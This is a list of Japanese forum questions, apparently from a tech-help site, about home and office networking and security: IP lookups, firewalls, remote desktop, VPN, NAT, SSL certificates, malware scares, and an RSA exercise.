概要 IPアドレス検索をすると、サイトによって結果が異なります。なぜでしょうか？ 詳細 とあるIPアドレスがあります。 101.102.241.192 です。 このIPアドレスの発信元がどこなのか、調べてみました。 IPひろば　　http://www.iphiroba.jp/　　での結果 IPアドレス割当てエリア 国 日本 都道府県（CF値） 京都 ( 29 ) 市区町村（CF値） 京都市 ( 14 ) Network Information: [ネットワーク情報] a. [IPネットワークアドレス] 101.102.240.0/23 b. [ネットワーク名] FON f. [組織名] ソフトバンクモバイル株式会社 g. [Organization] SoftBank Mobile Corp. m. [管理者連絡窓口] KM34911JP n. [技術連絡担当者] KM34911JP p. [ネームサーバ] [割当年月日] 2015/08/27 [返却年月日] [最終更新] 2015/08/27 09:02:02(JST) となりました aguse　https://www.aguse.jp/　での結果 運営組織 SoftBank Corp. Tokyo Shiodome Building., 1-9-1, Higashi-shinbashi, Minato-ku, Tokyo, 105-7304, Japan IPひろばでは地図上のピンは京都市に立ちましたが、aguseでは東京に立ちました。 なぜ結果が違うのでしょうか？
私はその知識が無いので変な質問になりますがご了承ください まずそのマルウェアの種類は抜き取るとれる学習能力があるのですか？ 簡単に手に入ってしまうものなんですか？ 今流行ってるその類のマルウェアはなんですか　また対策はどうしたらいいですか？
プリンターとルータが繋がりません。 [IPアドレス]を送信しています 32 バイトのデータ: 要求がタイムアウトしました。 [IPアドレス]からの応答: 宛先ホストに到達できません。と、Pingを確認しても接続されるべき内容が届いていないようです。 どなたかお分かりになられます方、居られましたらお教え頂きたいです。宜しくお願いします。
いつもお世話になっております。 掲題のとおり 簡単にリモートでリモート先のPCの電源をONにしたいのですが、簡単な方法はないでしょうか。 wakeuplunでできそうなのですが、 当方は固定IPを持っておりません、、 LANケーブルの間に簡単な装置をかましたらできるなど、アプリなど、簡単にできる方法はないでしょうか。
ファイアウォールの防御の種類としてパケットフィルタリング型ファイアウォール があるとWEBの記事をよんでいました。 WEBサーバーなどは公開しないといけないので DMZという非武装地帯においてWEBサーバーにのみパケット？を通す ように設定するような感じで認識をしましたが、 ここで疑問に思ったのが 普段何気にWEBを閲覧しているのですが この閲覧しているWEBは当然公開（公開の意味を間違っているかも・・・） されていると思っていたのですが、 そうとなると世の中のWEBサイトはすべて「いたずら」されるのでは？ とも思ってしまいました。 このあたりどのような技術？仕組み？でWEBサイトは守られて いるのでしょうか？ よろしくお願いします。
ｐｃ　Dell　Xps8700　windows10　IE11　セキュリティソフト　カスペルスキー2016 旅行社（ｓｔｗ）ツアーを検索し出発地までは進みますがその先ホテルの選択へ進みますがホテル名が表示しません、セキュリティソフトを停止すれば見ることができますが インターネットオプションで設定を変更しても改善が見られません。 どなたかＰＣに詳しい方どのようにすればよいか教えてください。 よろしくお願いします。
ファイアウォールについて気になったのですが、 会社などでは社内ネットワーク上にファイアウォールのサーバーが設定 されています。それとは別に各PCにもWindows標準の Windows Defender のファイアウォールソフトが入っています。 何故、ファイアウォールサーバーと各PCのWindows Defender の ファイアウォールとそれぞれ必要なのでしょうか？
つい最近まで、女子高生のバカッターが話題になっていました。 それと同じようなことを、友達の友達？がしていたことを思い出しました。 ニトリで、その人が裸になりベッドの中に入っている動画だったと記憶しています。 友達に面白半分で観せられ、観ていてかなり不快でしたが、その時は何もしませんでした。 しかし今にして思うと、不快になったとかそういう話ではなく、通報されるべき営業妨害行為なはずです。 その人が裸になって入っていたベッドを、購入してしまった人がいるかもしれません。 その方やお店のことを思うと、不憫過ぎます。 私は、その商品を買いたくないのは勿論、ニトリに行くのも嫌になりました。 その動画を観て、私と同じ気持ちになった人も一定数いると思います。 先ほど、友達に見せられたツイッターのアカウントを発見し問題の動画を探していましたが、既にツイートは削除されていました。 復元する方法や、どこかに保存されている可能性とかはありませんか？ 発見し次第、ニトリのお客様相談室に相談するつもりです。 身バレして復讐されるのが怖いので多くは書けませんが、下記が裸になってベッドに入った人の情報等です。 ・大阪市内在住 ・新高3男 ・問題の動画の投稿日は、去年の８月初旬 ・どこのニトリで撮られたかは不明 また、ベッドの動画は見当たりませんでしたが、他の問題映像は見付かりました。 観ていて本当に不快になります。 添付しておきます（本人の顔は伏せました）。 ご協力いただきたいです。 削除されたツイートは、どうすれば見れるのでしょうか。
普通にパソコンをしていても、PCの閲覧履歴って第三者に見られることってあるんですか？
1つのルータから8か所それぞれ異なる方向に分岐していて、それぞれの先に無線AP1～8を設置するのですが、 各無線APに接続しているユーザ同士が共有されないようにするにはどうしたらよいでしょうか。 例えば、無線AP1に接続しているユーザが共有フォルダ設定等していても、無線AP2に接続しているユーザから見る事ができないように。 できれば存在も知られない方がベストです。 こんな風にできればお互いが見えないのでしょうか。 無線AP1は192.168.1.* ～ 無線AP8は192.168.8.* 実現するためには機器の選定から必要ならおススメ例等教えていただけると助かります。 ちなみに、回線はフレッツ光にNTTレンタルのルータが起点となります。 ルータから変更しないといけないとしても対応可能です。
今日keioh株式会社とかいうところから電話が来て安くなるのでプロバイダーの変更をしてみませんか？と促されました。 怪しいなと思って調べてみたのですがどうもヒットする情報が少なくて判断に困っています。この会社は安全ですか？そして安くなるというのは(フレッツ光の一般的ネット契約)本当ですか？母がさっきから向こうからいわれるまま遠隔操作の設定してます！至急返答おねがいします！
社内メールって、リモートでお偉いさんとかに覗き見されてるんですかね？ たぶん全社員ではなくても、リストアップされた数名は、送信メールも受信メールも覗いてるものですか？ 私は悪い課長を内部告発したことで、もしかしたらリストアップ社員になっているかもしれません。
教えてください。初心者 リモートデスクトップなのですが、ノートパソコン①はルーターから有線でネットにつなげています もう一台のノート②からWIFI接続でリモートデスクトップに接続できます。 しかし屋外でＷＩＦＩ接続しようとすると １）サーバへのリモートアクセスが有効にされていない ２）リモートコンピューターの電源が入っていない ３）リモートコンピューターがネットワークで使用できない リモートコンピューターの電源が入っていること、ネットワークに接続されていること、リモートアクセスが有効になっていることを確認してください。 と出て接続できないのですが、なにか必要なことを出来ていないのでしょうか？ ネットで検索してもよくわからないので教えて頂けますか、宜しくお願い致します。
お世話になります。 現在インターネット接続時にWindows2008 ADがリゾルバとして外部（インターネット）の名前解決を行っていますが特定のドメイン（たとえば、goo.ne.jp）のみ名前解決を行う方法を調べています。 ■環境 WindowsPC（AD参加）→ Windows2008 AD　→　インターネット ■設定イメージ 名前解決を許可するドメインとして以下を設定 goo.ne.jp yahoo.co.jp ■名前解決の結果イメージ mail.goo.ne.jp　→　名前解決許可 www.goo.ne.jp　→　名前解決許可 mail.yahoo.co.jp　→　名前解決許可 www.yahoo.co.jp　→　名前解決許可 www.bing.com　→　名前解決不許可 管理の都合上、端末のhosts以外で実現したいと考えおります。 それ以外ではどのような方法でもよいので解決策をご教示いただけると助かります。 宜しくお願い致します。
necのルーターを使用していますが、今までポートに関して意識したことがありませんでした。 ポートの開放を確認するサイトで80だとか1050だとかを確認してみても 塞がってるようです。80だとか1050は一般的に使用するポートだと思うのですが、これは使うときに ルーターが適時判断して開いたり、閉めたりしているということですか？ 3389を閉鎖して使いたいのですが、そのサイトで確認しても既に塞がっているようです。 ルーター入れていれば危険なポートは何もしなくてもすべて塞がっているとかんがえていいのですか？
家庭内無線lan内からの接続に限ってリモートデスクトップを許可して、 インターネット側からの接続を物理的に出来なくすることは可能でしょうか？ 用途はタブレットからインターネットに繋がれたデスクトップパソコンでゲームなどをしてみたいです。 家庭内のみならvpnとかは使えませんよね？ wpa2とかは使えませんか？ windows10に標準搭載されているツールも含めて、もっとも安全で使いやすいソフトはどれでしょうか？ 設定に当たり注意する点、またリモートデスクトップよりこの用途に適している接続法、 おすすめの書籍などがありましたら、教えてください。宜しくお願い致します。
セキュリティの脅威でマルウェアという種類？言葉があります。 このマルウェアとたとえばDOS攻撃やクロスサイトスクリプティングなどは どのように違うのでしょうか？ （DOS攻撃などを総称してマルウェアと言う？） インターネットで調べてみましたがいまいちピンときませんでした。
こんにちわ。 現在IO-dataのLANDISK HDL-XR4.0のFTP機能を使って外部のクライアントとデータのやり取りをしています。 LANDISK側でIDとパスワードの設定はしていますが、セキュリティを強化したいと思っています。 FTPのフォルダ自体は外部から見える状態になっていますので、万が一、ＩＤとパスワードが流出した場合に不正アクセスされてしまう恐れがありますので、ルーターでアクセスを制限することはできるのでしようか。　社内でPCの管理者をしておりますが、ネットワークについては知識があまりないので困っています。代理店のSEに相談はしているのですが、なかなかいい返事はなく、会社からは早く設定できないかと急かされ、どうしていいかわからず、こちらに書き込みをしてみました。 よろしくお願いします。
wndows server 2012R2とserver 2008R2（どちらもstandard）をワークグループ環境で利用しているのですが、server 2008R2は業務アプリケーションを導入しているのですが、その業務アプリケーション（SQLserverを利用するデータベールアプリケーションです。）を導入してから、sever 2008R2でフォルダーを作成して、許可したユーザーしかアクセスできないようにしたいのですが、許可したユーザー以外でも、ユーザー登録してないユーザーでもアクセスできるいわゆるアクセスをeveryoneしたかの動作です。仕方がないので、別のサーバーを立て（server 2012R2）たのですが、同じなのです。会社の大事なデータがフリーアクセス状態なので、修正したいのですが、修正法がわかりません。 やりたいのが、server 2012R2で、フォルダーを作成して、許可ユーザー以外はアクセスさせないこと。しかし、登録してないユーザーからでもネットワーク越しにそのフォルダーが見えるまではいいのですが、アクセスはさせたくないのです。ちなみに同じネットワークにはbuffaloのnasやネットワークプリンターが２台あるだけです。いままで、こういうトラブルになったことがないので、とても困っています。それと足りない情報があれば、指摘していただければ提供します。よろしくお願い申し上げます。どなたかご教授いただけないでしょうか？
消去データなどの復元出来る技術者の方は、それだけで生計を立てていけるのでしょうか？ どういった学校へ進学して技能を磨いたら良いのでしょうか？ 詳しい方教えて下さい。
私のＰＣが、ある特定の人にいつも見られている気がします。その人は、私のＰＣに触れる可能性はない（０％）のですが、遠隔で見れてしまったりということはありますか？ＩＴに詳しい人の場合、そういうことはできますか？ 例えば、Ｇｏｏｇｌｅ　Ｃｈｒｏｍｅを使っていて、そこでいろいろなサイトを見たり、メールを開いたりしていると、何らかのきっかけでＧｏｏｇｌｅパスワードを知っている人が、遠方で、私のＷＥＢ履歴などを見れますか？ その場合は、私はどこを注意したら、防げるでしょうか？
アップルケアセンターなどのAppleに関わる会社で働いたことのある方に質問なのですが、シリアルナンバー？を入力すると、会社のパソコンからお客様のIphoneの画面を見ることができると、アップルケアセンターで働いている私の主人が言っていたのですが、仮に主人が私のシリアルナンバーを会社のパソコンから入力して私のIphonの画面を覗き見ることは可能なのでしょうか。 また、その際には私の携帯の画面に画面共有が行われていることは表示されるのでしょうか。 無知なもので、申し訳ございませんがどなたか回答よろしくお願いいたします。
本社 フレッツ光+プロバイダ(ASAHI-NET)+YAMAHA NVR500で 支社と外出先(iPhone)からVPN接続しています。 この度、本社、支社共にASAHI-NETからぷららに乗り換えたのですが、 支社からは今まで通りVPN接続が確立しますが、 外出先からVPN接続できなくなってしまいました。 NVR500の接続IDとパスワードをぷららのものに変更したのみなので、 セキュリティ設定やポート設定等は変えていません。 ぷらら同士だから接続できて他プロバイダだからできないのか、 iPhoneからのアクセスにはルータ側に設定が必要なのか分かりません。 どうかお知恵を貸してください。
IPから進入できるのは知っています。 誘導urlに飛ばされて、このようなメッセージが出ました。 http://imgur.com/bgnc9vv このように表示されるサイトは色々ありますが、相手がPCの貧弱性、マルウェアを見抜いたという事でしょうか？
PCにウイルスが入りました。 特定のファイルだけが画面から削除されてしまいます。 ネットで調べていろいろ対策はしたものの削除できませんでした。 セキュリティソフトも全て除外させてみたり、削除してみたりしたのですが、ウイルスは消えません。 アクセスも拒否されてしまいます。 レジストリから削除を試みたのですが、windowsのファイルの中にあるみたいでうかつに消すことができません。 削除されるファイルはexeです。 どなたか解決策はないでしょうか。
特定のURLにアクセスできないようにしたいです。 目的は、暇があるとエロサイトを見てしまうため、それを自粛することです。 今は、hostsでそのサイトのURLをlocalhostに書き換えて、同様にルーターにも、そのサイトのURLをlocalhostに書き換えています。 ですが、この方法だと、自分で設定したので、自分で簡単に解除できてしまいます。 やりたいことは、 自分で解除できるけど、そのためには時間がかかるとか、何か面倒な手順が必要、のような状況を作りたいです。 何か良い方法ありませんか？ ネットワークにはあまり知識がありませんが、ヒントをくだされば、あとは自分で勉強します。
たとえば小説家がネタを盗まれないように、書き始める前にはインターネットを切ったとします。 そしてメモリースティックを差し込みます。 小説を書きこむのはメモリースティックのなかに保存されているワード。 このメモリースティックを外してからネットに繋ぐ・・・ このような方法をとっても、作品がハッキングによって盗まれる可能性はあるのでしょうか？
タイトルについてお尋ねさせて頂きました。 インターネット接続のルーターにＬＡＮ接続された機器 （主に屋内環境使用での）ＩＰ固定化に関する事例による Ｑ＆Ａは、よく見受けられます。 今回、質問の本題は、屋外移動利用からのインターネット 接続になります。 概要を記しますと、屋外なのでルーターは使えないので、 スマホのテザリング機能よりパソコンとＵＳＢ接続し、 そのパソコンとターゲットのデバイスはＬＡＮケーブルで 接続してあります。 そこで、ＩＰアドレスの確認を行うとパソコンのＩＰアドレス は固定アドレスになってますが、一方のデバイスの方は 遮断して接続する度に、ＩＰアドレスが変わってしまいます。 テザリングを使わない状態でも、パソコンとデバイスの ＩＰアドレス関係は、前述と同じになります。 これではＩＰアドレスが変化すると、目的とするwebページに デバイスのＩＰアドレスを載せ、リンクにより デバイスに到達するという事ができなくなります。 この様にＩＰの自動割当により、毎回アドレスが 変わらずに、固定化させる方法は無いものでしょうか？ 大変アバウトな質問になりましたが、解決の糸口になる ご回答頂けることを切にお願い申し上げます。
ネットにはルーターを介在すればウィルスから安全である旨のサイトがありますが本当でしょうか。(私はWiFiを使いwindows10でウィルスバスタークラウドも導入していますが特段セキュリテイソフトを削除することは考えていません)　また、ルーターがガードできるとすれば何故ですか。
Windows OS 非搭載モデルって事はOSが付いていないタブレットですよね？ A204YBにはOSは入れられるのですか？ タブレットPCとして使えますか？ タブレットの事をあまり知らない者で A204YBのメモリーカードは何GBまで使えますか？ microSDXCメモリーカード128GBまででいいのですか？
画像の記号は何でしょうか？ トランジスタだと縦線一本だと思うのですが 二本あります。 ご存知の方よろしくお願いいたします。
LINUXのiptablesおよびファイヤーフォールについて詳細にかつ分かりやすく記載された書籍などを探しています。 特に、DDOS攻撃や、wordpressのxmlrpc.phpファイルへの対策などを行いたいのですが ご教授のほどお願い致します。 特に, DDOS攻撃によいとされているhashlimitモジュールなどについて詳しく書かれていると非常に助かります。
先日、Win8.1のPCをWin10にアップデートしましたが、デバイス対応の問題があり、 元のWin8.1に復元しました。 ところが、家庭内ネットワーク（同じルーターに接続）している他のPCにアクセスしようとすると 下記のパスワードを求める画面が出て、アクセス出来ません。 パスワードはログイン時のパスワードを試してみましたが、違いますと表示されます。 アップデート前は普通にアクセス出来ていました。 トラブルシューティングを行うと「このコンピューターで１つ以上のプロトコルが不足しています」 と表示されます。 因みに３台の内、２台では普通に相互アクセスが出来ています。 現状Win10のPCからWin8.1に復元したPCへのみアクセスが出来ません。 詳しい方、ご教授をお願い致します。
ウィンドウズ１０搭載のノートパソコンを使っています。フリーソフトをダウンロードしたのですが、セキュリティーチェックがかかって、正しくダウンロード出来ません。外せば、パソコンに取り込めると思うのですが、外し方を教えて下さい。
Wi－Fiルータが思うように接続できず、原因を調べています。私の思い違いかも知れないので確認したく質問致します。 Wi－FiルータはDHCP等によってそれ自体がWAN側に認識され（IPアドレスの取得）、ワイヤレスでPC、スマホなどからの接続要請が来ると、プライベートアドレスを発行させてそれを認識し、PC,スマホをWANに接続させる、という風に理解しています。その際、接続の許可を与えるためにパスワードを利用する、というものです。このような理解でよろしいのでしょうか。 もし、これでよいとした場合、現在Wi－FiルータにノートPCから接続の要請を出しているのですが、”ネットワークの要件をチェックしています”というメッセージで先に進みません。Wi－FiルータとPCとの間の距離は10cmで電波の強さはfullです。パスワードはWi－Fiルータの裏面シール上に表示されています。しばらくするとおそらく切られると思います。 Wi－Fiルータとの接続はとにかく、電波での認識、パスワード、Wi－Fiルータ自体のWANとの接続、の3点だけだと思っており、PCが何を考え込んでいるのだろうと思うのですが、楽観的過ぎるでしょうか。どこで滞るのか不思議なのですが。 何か私が考え違いをしていたら教えて頂きたいのですが。取説はネットに出ており、ちょっと私が考えていなかったことが書いてありました。WANへの接続の前に ※機器が故障しているといのは論外ですね。買ったばっかりというのと見た目で判断できないので。 ※WPSボタンというのがありますが、これはパスワードが不要なのでしょうか。 ※Windows10でワイヤレスは利用可能。機内モードはオフだと思います。機内モードというアイコンが出ていますが、反転しているのでオフなのだろうと思いますが。
問題のあるセキュリティ証明書のショッピングサイトで買い物をしても大丈夫でしょうか。 具体的には、以下のショッピングサイトです。 ■ MALDEPO http://www.maldepo.jp/shop/ カートに商品を追加して、「購入手続きへ」をクリックすると、証明書のエラーが表示されます。 買い物を続けても大丈夫でしょうか。 自分で色々調べたいのですが、家族から商品の購入をせかされており、あまり何日も調べていられないので、詳しい方がおられましたらお教え頂けないでしょうか。
http://bylines.news.yahoo.co.jp/ishikawatsutsumu … ですが、 ”メール転送されても大丈夫”　 というような、メール情報を保護する方法はありますか？ よろしくお願いします。
Windows8から10へアップグレード後、8では正常に利用出来ていた証明書 による無線LAN認証(802.1x)が出来なくなる事象が発生しました。 解決方法についてお分かりでしたら、ご教示いただけますでしょうか。 証明書のインポート先については以下のとおり。 ・証明書のインポート先：「ローカルコンピューター」を選択 ・証明書ストア：証明書の種類に基づいて、自動的に証明書ストアを選択 　　　　　　　　⇒信頼されたルート証明機関 無線LAN設定を試行すると、以下のメッセージが表示されて接続に失敗。 Error：「お使いのデバイスのサインイン用件とネットワークに互換性が 　　　　 ないため、接続できません。」　 本件について原因を調査するも、無線LANでの802.1x認証時不具合の 情報が出回っておらず、解決に至らず。 他に手段が無いか、以下試行について試行・確認しました。 1.「certmgr.msc」にてインポートした証明書を削除し、 　「信頼されたルート証明機関」を手動選択 ⇒以下のメッセージが表示されて接続不可。 　Error：「サインインするための証明書が必要なため、接続できません。」 　 「1.」の方法(手動選択)だと、無線LAN設定時の「証明書の選択を構成」にて、 証明書が表示されない事象が発生すると共に、"セキュリティの警告"が発生。 ・「このセキュリティ証明書は、信頼する会社から発行されていません。 　　証明書を表示して、この証明機関を信頼するかどうか決定してください。」 ・「セキュリティ証明書の名前が無効であるか、またはサイト名と一致しません。」 2. ワイヤレスネットワークのプロパティにて、セキュリティの種類 　「802.1X」を選択 ⇒認証失敗。 3. 802.1X認証を有効にする ⇒認証失敗。 　参考URL：ttp://windows.microsoft.com/ja-jp/windows/enable-802-1x-authentication#1TC=windows-7 本件の解決策についてご教示いただけますと幸いです。 よろしくお願いいたします。
今日windows8からwindows10にして、パソコンを初期化しました。 バックアップを外付けHDDにとっておいたのですが、アクセス許可がもらえません。 バックアップはBackup_Utilityとかいうソフトでとっていました。 今までは「このフォルダーにアクセスする許可がありません」→「許可」でアクセスできたのですが、今回のは「このフォルダーへアクセスするアクセス許可が拒否されています」と出て、セキュリティタブを見てもよくわかりません。 どうすればアクセスできるようになりますか。
家族がアダルトサイトを見ていたようで急に大量のマルウェアに感染していますこのままでは数日で携帯電話のデータが破損する恐れがあります。みたいな警告が画面に出てきてウイルスを駆除するには画面に従ってアプリをダウンロードしてください。とでてきたので360securityと言うアプリをダウンロードしてスキャンしたら、安全です。と画面に表示されたのですがネットで色々調べてgmailなどのパスワード変更やNTTの初期設定のパスワード変更も2回やったんですが変更直後に電話が2回ともかかってきて2回ともガサガサ音がするだけで何もしゃべらないんです。ただの間違い電話か何かと思ったのですが、もしかしたらウイルスに感染してパソコンのデータが盗まれてしまったのでしょうか？
Win 8.1です、宜しくお願いします。 Webサイトからアプレットを見ようとすると 「表示中のページはJavaを使用しています。Javaサポートに関する詳細情報は、 MicroSoftのWebサイトで得ることができます。」 という内容のダイヤログが表示されます。 java JDKはインストール済です。 どこからどのように設定を変更してやれば良いのでしょうか。 VISTAから見ようとしても同じようなダイヤログが出て見ることが 出来ません。 宜しくお願いします。
本社と拠点A、B間をvpnで構築しているネットワークがあり、それとは別に本社と拠点C、D間をvpnで接続しているネットワークがあります。 お互いのネットワークは繋がっていませんが、繋げたい場合は一般的にどんな手段を使いますでしょうか？
ＰＣ内のクッキーを全て削除したいのですが、CCleanerのクッキーの項目１つを選択してクリーンアップすれば十分ですか？
使っているレンタルサーバがSSL持ち込み可能（購入はセルフサービス）だということでＳＳＬ証明書を自力で購入したところまではよかったのですが疑問があったので質問させてください。 レンタルサーバはLinux系ＯＳです。 SSL証明書は、SSL証明書販売業者が提供しているCSRジェネレーター(IIS (Windows))で署名要求書（CSR）と秘密鍵を生成して、CSR をSSL証明書販売業者に送って発行してもらったのですが、このSSL証明書ってLinux系ＯＳで使えるもんなんですか？ なんかいろんなサイトを検索閲覧していくうちに、なんとなくWindowsのジェネレーターで作成したものはLinux系ＯＳで使えないんじゃないかと思ったもので、 それならばレンタルサーバ(LinuxOS)で予めＣＳＲと秘密鍵を生成してそのCSR をSSL販売業者に送ってSSL証明書を再発行してもらおうと思っているのですが、これに関してはちゃんとLinux系ＯＳで使ますよね？ 質問のまとめ LinuxOSでSSL証明書を使用する場合は、LinuxOSでＣＳＲと秘密鍵を生成しないとダメ、IIS (Windows)でＣＳＲと秘密鍵を生成したものは使えないということで合ってますでしょうか。 SSL設定に関して本当にズブの素人なので知識のなさはご了承ください。
windows10なのですが管理者のパスワードを忘れてしまったのでログインできません。 今は別のアカウントから質問しているのですが管理者のほうに大事な情報を入れているのでどうしても管理者のほうにはいりたいのですがどうすればよいのでしょうか？ パソコン初心者なので詳しく説明していただくとうれしいです
忘れることに起こっていたことなんですが，「ネットワークエラー IP アドレスの競合が検出されました。 このネットワーク上の別のコンピュータが、このコンピュータと同じ IP アドレスを使用しています。 ネットワーク管理者に問い合わせてこの問題を解決してください。 詳細については、Windows システムイベントログを参照してください。」 というメッセージが表示されることがあります。 ネットワークの構成はルータ1台にパソコン1台繋がっているだけです。 そのパソコンはWindows8.1ProでHyperマネージャを使ってUbuntuを入れています。 Ubuntuを設定しているIPアドレスもDHCPでWindows8.1もDHCPで動的です。 ルータの配分がうまくいっていないんでしょうか？ あとUbuntuはHyperマネージャで常時起動しています。 Windows8.1はシャットダウンしています。 なのでUbuntuは実質固定IPみたいなものだから，今回のようなIP アドレスの競合は出ないと思ったんですが，何か違ったんでしょうか？ よろしくお願いします。
ＮＴＴフレッツ光に加入しています。 ホームゲートウェイはＰＲ－５００ＫＩです。 今回、パナソニックのＬｅｔ’ｎｏｔｅ　 CF-S10を入手しました。 このＰＣは無線ＬＡＮ機能が内臓しているようなので、新規に無線ＬＡＮの親機を購入して無線ＬＡＮにて接続したいです。 このホームゲートウェイとノートＰＣに適合する、おすすめの無線ＬＡＮ親機をおしえてくださいませ。
家庭用ブロードバンドルータのNATの仕組みが気になって調べています。 http://www.infraexpert.com/study/ip11.html http://www.infraexpert.com/study/ip11.5.html 上記のページなどを読んでスタティックNAT、ダイナミックNAT、PAT（NAPT／IPマスカレード）があるということまでは分かったのですが、家庭の場合だと 変換エントリを設定した覚えはない→スタティックNATではない ルータが持っているIPアドレスは1個だけで、複数プールしていないと思う→ダイナミックNATではない ということでNAPTになっていると思うのですが、合ってますでしょうか？ そうだとすると、NAPTはポート番号を変換するのでTCP/UDPのパケットしか変換できませんよね。 ICMPパケットはどう変換しているのでしょうか？ 例えば下記ページの図で192.168.0.1から200.1.1.1へpingをうった場合、ルータはどうやってreplyパケットを192.168.0.1へ戻すべきだと判断しているでしょうか？ http://www.infraexpert.com/study/ip11.5.html
現在、上題について社内で検討しており、ご意見を頂けますでしょうか。 自社ではGMailを社内業務のメールとして使用しております。 使用上、現状何も制限をしていないので、家のPCや個人のスマホ、 東横INなどのホテル用意のPC、漫画喫茶のPCなど・・、 あらゆる箇所からメールが参照できますし、 メールに添付のファイルも各端末にダウンロードできてしまいます。 これについて、以下のリスクがあると考えています。 ・ホテルや漫画喫茶に仮に不注意でGMailをログオフし忘れた場合、第三者に閲覧される可能性 ・メールに添付の社内の機密情報のファイルが、ホテルや漫画喫茶のPCにダウンロードされ、漏洩する可能性 ・自宅や個人のPCで仕事をして、これらが盗難となった場合、GMailのIDパスワードやメールに添付の情報漏洩のリスクが発生 など これらを考慮すると、「社内オフィス以外からはメールは見させない」 「どうしても社外で仕事をする場合は、会社資産のノートPCやスマホを貸与」という方針に しようかと思いますが、これはやりすぎの懸念はありますでしょうか？。 それとも正しいアプローチでしょうか？。 皆様のご経験などお聞かせ頂けますと幸いです。
とある企業サイトにある個人情報（住所、氏名、電話番号、メールアドレス、勤務先など）を求められるhttpsで暗号化されたフォームに入力して送信したら、入力したメールアドレス宛てに内容確認として送信した個人情報が全て記載されたメールが送られてきました。そのメールは暗号化されている様子はなく、それではフォームでhttpsで暗号化してあっても意味がなく、個人情報が盗まれてしまう可能性があると感じました。私が入力〜送信した個人情報は盗まれた可能性はありますか？
ベルウェール渋谷の事業内容の「インバウンド」と「アウトバウンド」の違いって何ですか？ 先日、ベルウェール渋谷というコールセンター会社のサービス内容を調べていたら、インバウンドとアウトバウンドという言葉を目にしました。 この二つの違いを教えてください。 自分で調べてみたのですが分からずじまいだったので、分かりやすく教えて頂けると助かります。 細かい質問ですが、回答お待ちしています。
お尋ねします 無料クリーナーソフト Wise Disk cIeaner865　をダウンロードして使いたいとおもっていますが 使用料　料金は無料ですか よろしくお願いいたします。
無線LANをずっと使っていますが最近すぐきれるようになりました。 症状としては、ルータには特にエラー表示されず切断されている。PCのワイヤレス接続先に表示されなくなる。（スマフォなどから検索してもみつからない） しばらくするとまたつながるようになる。を繰り返す。 しばらくつながったままの状態が続くときもあります。 特に設定なども変更しておらず、接続する機器も増やしたりしていません。 変化があったとすれば2つ隣の土地にマンション建設しており、電話線含む工事などを行っています。 機器はBuffalo Air station WHR-G300Nです。かなり古いというのもあるかもしれません・・
自宅PCを外部公開し、知人数名間だけで使用しています。 固定IPではないためダイナミックDNSを利用し、 aaa.bbb.com ccc.ddd.com eee.fff.com の様な3種類の名称を使い分けています。 しかしここ最近アクセスが非常に思いので、ルータのログを見たところ、 海外らしきIPからのアクセスが集中しておりました。 恐らくどれかのダイナミックDNSのドメイン名が漏れているため相手がアクセスできているのかと思うのですが、 3種類のどのドメイン名経由からのアクセスなのか調べる方法はありますでしょうか。
今晩は、宜しくお願いします。 プロバイダーと一般家庭とのインターネット接続のIPアドレスについて質問 致します。 プロバイダー～家庭間は、グローバルIPで接続されますが、 接続の都度グローバルIPは変わると聞きました。 また、常時接続の場合でも、グローバルIPは変わると聞きました。 このシステムがよく理解出来ないのですが、どのようなタイミングで 変わるのでしょうか。 また、敢えてグローバルIPを変える必要が何故あるのでしょうか。 セキュリティ上の理由とかあるのでしょうか。 以上、宜しくお願いします。
アルゴリズムを考えています。 このパスワードの強度をチェックするサイトの項目を見ると http://www.benricho.org/password_meter/ ・大文字が連続 ・小文字が連続 との項目があるのですが上記の条件を当て嵌めるとパスワードの規則性が出来てしまうので不適切ではないのですか？ 宜しくお願いします。
p=13, q=11, e=7を使ったRSA暗号を考える。 空欄□を埋めよ。という問題答えは以下のようになるのですが、解き方を教えてください。 （１）(p-1)(q-1)とeに対する拡張ユークリッドの互除法により、 ed≡1 (mod (p-1)(q-1))を満たすdは、d=□ 答え103 （２）秘密鍵は、Sk=d、公開鍵Pkは、 Pk=(N,e)=(□,７) 。 　　　但し、N=pq 答え143 （３）平文m=10の暗号文Cは□。但し、C=m^e mod N 答え10 次の定理を使うと計算が簡単である： a≡a’ (mod N)かつb≡b’ (mod N)ならば、 (ab)≡(a’b’) (mod N) （例）10^7≡(10^2)^3 10≡(-43)^3 10 　　　≡(-43)^2×-430≡…. (mod 143)
法人でフレッツ光ネクストでプロバイダはBIGLOBEを使用しています。 先日、グローバルIPの固定の申し込みをし、IPを発行してもらいました。 その際、IPアドレスとサブネットマスクが記載されていたのですが、 現状、弊社のLAN上で使用しているサブネットマスクと発行されたサブネットマスクが異なります。 （使用中のサブネットマスク：255.255.255.0、発行されたサブネットマスク：255.255.255.255） 固定IPにするにはルーターに設定しているユーザー名を変更すれば設定完了とBIGLOBEからは聞いているのですが、LAN上で設定しているサブネットマスクと発行されたサブネットマスクが異なっていてもインターネットの接続等には問題はありませんでしょうか。 ルーターはヤマハのRTX1200を使用しております。
RSA暗号で使う２つの素数はそれぞれ50桁を超える莫大な数がベストだということをwebサイトなどで知ったのですが、市販のPCではint型でも43億ぐらいの数までしか扱えないので、自作のRSA暗号化ソフトといったものを作ることは不可能なのでしょうか？
概要 WEBシステムの一般的な認証形式はBASIC認証という方式か？　それ以外か？ 詳細 WEBシステムでは会員制で機能を限定するシステムがしばしば用いられます。 例えば、ヤフーオークションや、ここの質問サイト（OKWAVEと提携しているもの）などです。 一般閲覧者（非会員）は、ある程度のページの閲覧は出来ますが、それ以上の機能 例えば、ヤフーオークションなら、オークション品の入札、落札、出品など、 質問システム（OKWAVEと提携しているもの）ならば、質問投稿、回答投稿などです。 この認証の仕組みは、まずWEBサイトの会員申込みページにおいて、氏名、メルアド、その他、必要事項を入力し、 ID,パスワードを自分で決めて、会員申請をします。 管理者が会員申請の承認、却下をします。 その結果は申込者に対してメールにて自動回答されます。 承認された者は、それ以降はログインページにおいて、ID,パスワードを入力すると、ログインが出来、 会員のみが使える機能が使用可能となります。 また、会員はログイン後に、ID変更、パスワード変更、パスワード忘却時のパスワード回答、登録内容の変更、退会申請、等が出来ます。 （ID変更はシステムによっては許可しない場合もありますが） また、当たり前ですが、この認証システムは一度に多数の会員が同時ログインしても大丈夫なように 作ってあります。 さて、このような仕組みの認証方式は、BASIC認証という方式を使っているのでしょうか？ それとも別の方式でしょうか？ BASIC認証を使わないのであれば、BASIC認証では適さない理由、BASIC認証が使われない理由を教えてください。
